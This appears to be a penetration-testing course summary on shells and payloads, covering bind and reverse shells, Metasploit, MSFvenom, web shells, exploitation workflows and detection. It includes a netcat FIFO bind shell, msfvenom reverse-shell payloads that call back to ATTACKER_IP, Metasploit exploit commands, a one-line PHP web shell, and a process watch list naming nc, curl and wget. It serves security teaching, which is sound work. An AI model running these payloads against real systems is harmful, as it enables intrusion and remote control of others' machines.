# 🐚 Shells & Payloads – Complete Module Summary

## 📘 Overview

This document provides a complete reference for the **Shells & Payloads** module, covering shell fundamentals, bind and reverse shells, payloads, Metasploit, MSFvenom, Windows/Linux exploitation, web shells, detection, prevention, and a final engagement workflow.

---

## 1. The Basics: What Is a Shell?

A **shell** is a program that provides an interface for interacting with an operating system through commands.

Common shells include:

* `bash`
* `zsh`
* `cmd`
* `PowerShell`

In penetration testing, a **shell** generally refers to remote command-line access obtained after successfully exploiting a target.

### Why Get a Shell?

A shell can provide access to:

* The filesystem
* Operating-system commands
* Privilege escalation opportunities
* Internal network resources
* File transfer capabilities
* Further enumeration and exploitation

### Shell Perspectives

| Perspective      | Description                                                                  |
| ---------------- | ---------------------------------------------------------------------------- |
| **Computing**    | A command-line interface such as Bash or PowerShell                          |
| **Exploitation** | Remote command execution obtained through exploitation                       |
| **Web**          | A server-side script such as PHP, ASPX, or JSP capable of executing commands |

---

## 2. Anatomy of a Shell

A **terminal emulator** is the application used to interact with a shell.

Examples:

* Windows Terminal
* GNOME Terminal
* iTerm2

The **shell** is the command interpreter running inside the terminal.

For example:

```bash
ps
env | grep SHELL
```

> Terminal and shell are not the same thing. Multiple different shells can be used from the same terminal emulator.

---

## 3. Bind Shells vs Reverse Shells

| Feature                 | Bind Shell                                 | Reverse Shell                     |
| ----------------------- | ------------------------------------------ | --------------------------------- |
| Listener                | Target listens                             | Attacker listens                  |
| Connection              | Attacker connects to target                | Target connects back to attacker  |
| Firewall considerations | Inbound traffic may be blocked             | Outbound traffic may be permitted |
| Typical use             | Direct access to exposed listening service | Common remote-shell technique     |

### Bind Shell Example

On the target:

```bash
nc -lvnp 7777
```

From the attacking machine:

```bash
nc -nv TARGET_IP 7777
```

A bind shell can also be constructed using a FIFO:

```bash
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l 7777 > /tmp/f
```

### Reverse Shell Concept

A reverse shell reverses the connection direction:

```text
Target ───────────────► Attacker
        outbound connection
```

The attacker starts a listener while the compromised target initiates the connection.

---

## 4. Understanding Payloads

A **payload** is the code or command delivered after exploitation to perform an intended action.

Examples include:

* Command execution
* Reverse shells
* Meterpreter sessions
* Web shells
* File operations

### Linux Reverse-Shell Components

A typical Linux shell payload may use:

| Component       | Purpose                                   |
| --------------- | ----------------------------------------- |
| `rm -f /tmp/f`  | Removes an existing FIFO                  |
| `mkfifo /tmp/f` | Creates a named pipe                      |
| `cat /tmp/f`    | Reads data from the pipe                  |
| `/bin/bash -i`  | Starts an interactive Bash shell          |
| `2>&1`          | Redirects errors to standard output       |
| `nc`            | Provides network communication            |
| `> /tmp/f`      | Sends received data back through the FIFO |

---

## 5. Automating Exploitation with Metasploit

**Metasploit Framework** provides modules for exploitation, payload delivery, post-exploitation, and auxiliary tasks.

### Basic Workflow

```text
Search
  ↓
Select module
  ↓
Configure options
  ↓
Select payload
  ↓
Execute
  ↓
Obtain session
```

### Common Commands

```text
msfconsole

search smb
search eternal

use exploit/windows/smb/psexec

set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 443

exploit
```

### Meterpreter

**Meterpreter** is a feature-rich Metasploit payload that provides capabilities such as:

* Command execution
* File interaction
* Process interaction
* Network information
* Session management

A native system shell can generally be accessed through:

```text
shell
```

---

## 6. Standalone Payloads with MSFvenom

`msfvenom` can generate standalone payloads in different formats.

### Staged vs Stageless

**Staged payload:**

```text
Small initial stager
        ↓
Downloads/loads remaining payload
        ↓
Full session
```

**Stageless payload:**

```text
Complete payload
        ↓
Direct execution
        ↓
Session
```

Examples:

```text
windows/meterpreter/reverse_tcp
windows/meterpreter_reverse_tcp
```

### Linux Payload Example

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o backup.elf
```

### Windows Payload Example

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o bonus.exe
```

> Use generated payloads only in systems where you have explicit authorization.

---

## 7. Infiltrating Windows

### Windows Fingerprinting

A TTL of approximately `128` can be an indicator of Windows, although TTL values should not be treated as definitive OS identification.

Useful enumeration:

```bash
nmap -O -v TARGET_IP
```

Common Windows-related ports include:

```text
135   RPC
139   NetBIOS
445   SMB
3389  RDP
```

### Notable Historical Windows Vulnerabilities

| Vulnerability      | CVE / Bulletin               | Description                           |
| ------------------ | ---------------------------- | ------------------------------------- |
| **MS08-067**       | MS08-067                     | Windows Server Service vulnerability  |
| **EternalBlue**    | MS17-010                     | SMBv1 vulnerability                   |
| **PrintNightmare** | CVE-2021-1675 / related CVEs | Windows Print Spooler vulnerabilities |
| **BlueKeep**       | CVE-2019-0708                | RDP vulnerability                     |
| **Zerologon**      | CVE-2020-1472                | Netlogon cryptographic vulnerability  |

### Common Windows Script/File Types

| Type       | Extension | Typical Purpose            |
| ---------- | --------- | -------------------------- |
| Batch      | `.bat`    | Command scripting          |
| VBScript   | `.vbs`    | Windows scripting          |
| MSI        | `.msi`    | Windows Installer packages |
| DLL        | `.dll`    | Dynamic libraries          |
| PowerShell | `.ps1`    | PowerShell scripts         |

### CMD vs PowerShell

**CMD**

* Older command interpreter
* Simple command execution
* Commonly available on Windows

**PowerShell**

* .NET integration
* Advanced scripting
* Extensive administrative capabilities
* Commonly monitored by modern security tooling

---

## 8. Infiltrating Linux

Linux systems are common targets during penetration tests because of their widespread use in servers, applications, and infrastructure.

### Example: rConfig

The vulnerable **rConfig 3.9.6** application can be used in authorized labs to demonstrate web-based exploitation and command execution.

Example Metasploit workflow:

```text
msfconsole

use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set PAYLOAD php/reverse_php

exploit
```

### Upgrading a Limited Shell

If a shell is non-interactive, a TTY can sometimes be spawned using available interpreters.

Python:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Other possible interpreters include:

```bash
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
awk 'BEGIN {system("/bin/sh")}'
```

The exact technique depends on what interpreters and binaries are available on the target.

---

## 9. Web Shells

A **web shell** is a server-side script that provides command execution through a web application.

Common formats include:

* PHP
* ASPX
* JSP

A web shell can provide an initial foothold and may subsequently be upgraded to a more interactive session.

### Laudanum ASPX Shell

Example location on Kali:

```text
/usr/share/laudanum/aspx/shell.aspx
```

In an authorized lab, configuration may require restricting access to the attacking IP before deployment.

Example access pattern:

```text
http://TARGET/files/shell.aspx
```

### Antak

**Antak** is an ASPX PowerShell web shell associated with Nishang.

Example location:

```text
/usr/share/nishang/Antak-WebShell/antak.aspx
```

It can provide browser-based PowerShell interaction in a controlled environment.

### PHP Web Shell

A minimal PHP command-execution example is:

```php
<?php system($_GET["cmd"]); ?>
```

For authorized testing, this demonstrates how server-side command execution can be exposed through an HTTP parameter.

---

## 10. Detection & Prevention

Shells and payloads leave observable indicators that defenders can monitor.

### MITRE ATT&CK Concepts

| Tactic                  | Description                                         |
| ----------------------- | --------------------------------------------------- |
| **Initial Access**      | Obtaining an initial foothold                       |
| **Execution**           | Running commands or malicious code                  |
| **Command and Control** | Maintaining communication with a compromised system |

### What to Monitor

#### File Uploads

Monitor for:

* Unexpected executable files
* Server-side scripts
* Suspicious extensions
* Executable content disguised as images
* Uploads followed by immediate HTTP access

#### Process Activity

Investigate unusual:

```text
whoami
powershell
cmd.exe
bash
nc
curl
wget
```

especially when executed by web-server processes.

#### Network Traffic

Look for:

* Unexpected outbound connections
* Connections to unusual ports
* Repeated beaconing
* Unexpected connections from servers to external systems
* Command-and-control traffic

### Defensive Tools

Useful sources of telemetry include:

* Firewall logs
* NetFlow
* EDR
* SIEM
* PowerShell logging
* Windows Event Logs
* Linux audit logs
* Web-server access logs
* Process creation logs
* Network monitoring tools

### Mitigations

* Apply security patches
* Enforce least privilege
* Restrict unnecessary outbound traffic
* Segment networks
* Secure file-upload functionality
* Validate file extensions and MIME types
* Store uploads outside executable web directories
* Disable unnecessary scripting engines
* Deploy EDR/AV
* Monitor PowerShell and command execution
* Implement strong authentication
* Regularly review web-server permissions

---

## 11. Final Engagement – Putting It All Together

### Scenario

A foothold system provides access to an internal network:

```text
172.16.0.0/23
```

Three internal systems are identified:

```text
Host-1 → Windows + Tomcat :8080
Host-2 → Linux + rConfig
Host-3 → Windows + SMB
```

### Engagement Workflow

```text
Initial Access
      ↓
Network Enumeration
      ↓
Service Identification
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Shell / Session
      ↓
Privilege Escalation
      ↓
Internal Enumeration
      ↓
Documentation
```

### Step 1 — Access the Foothold

Use the credentials supplied by the authorized lab.

### Step 2 — Identify Internal Hosts

Perform network discovery and service enumeration.

Example:

```bash
nmap -sV -O TARGET_IP
```

### Step 3 — Enumerate Web Applications

For HTTP services, identify:

* Virtual hosts
* Web directories
* Application versions
* Login panels
* Management interfaces
* File-upload functionality
* Configuration endpoints

### Step 4 — Assess Host-1

For the Tomcat server, determine whether the management interface is exposed and whether the supplied credentials provide administrative access.

### Step 5 — Assess Host-2

For rConfig, identify the application version and determine whether the deployment is vulnerable to a known file-upload or command-execution issue.

### Step 6 — Assess Host-3

For SMB, identify:

```text
SMB version
OS version
Available shares
Authentication requirements
Known vulnerabilities
```

Only exploit a known vulnerability when the engagement scope explicitly permits it.

### Step 7 — Establish a Shell

Depending on the vulnerability and target:

```text
Web shell
Reverse shell
Bind shell
Meterpreter
Native system shell
```

### Step 8 — Stabilize the Session

If necessary:

* Upgrade to an interactive TTY
* Confirm the current user
* Determine the operating system
* Identify network interfaces
* Enumerate available privileges

Useful commands:

```bash
whoami
id
hostname
uname -a
ip addr
```

Windows equivalents include:

```cmd
whoami
hostname
ipconfig
systeminfo
```

### Step 9 — Collect Evidence

Document:

* Target IP
* Vulnerability
* Exploitation method
* Initial access
* User context
* Commands executed
* Evidence/flags
* Remediation recommendations

---

## 📌 Quick Reference

### Shell Types

```text
Shell
├── Local Shell
├── Bind Shell
├── Reverse Shell
└── Web Shell
```

### Common Payload Concepts

```text
Payload
├── Command Execution
├── Reverse Shell
├── Meterpreter
├── Web Shell
├── Staged
└── Stageless
```

### Typical Assessment Flow

```text
Recon
  ↓
Enumeration
  ↓
Vulnerability Identification
  ↓
Exploitation
  ↓
Shell
  ↓
Stabilization
  ↓
Privilege Escalation
  ↓
Lateral Movement
  ↓
Evidence Collection
  ↓
Reporting
```

---

## 🛡️ Defensive Takeaway

Understanding shells and payloads is valuable not only for offensive security but also for detection engineering and incident response.

A defender should understand:

1. **How initial command execution occurs**
2. **How shells communicate**
3. **What processes are spawned**
4. **What network connections are created**
5. **What files are written**
6. **What authentication and privilege boundaries are crossed**
7. **How to detect and prevent the behavior**

The goal is to understand the complete attack chain:

```text
Vulnerability
     ↓
Initial Access
     ↓
Code Execution
     ↓
Shell
     ↓
Privilege Escalation
     ↓
Lateral Movement
     ↓
Command & Control
     ↓
Impact
```

## ⚠️ Legal & Ethical Use

All exploitation, payload generation, shell deployment, and post-exploitation activities should be performed only against systems you own or systems for which you have explicit authorization, such as controlled labs, CTFs, and approved penetration-testing engagements.

**Happy hacking — and stay legal. 🔐**
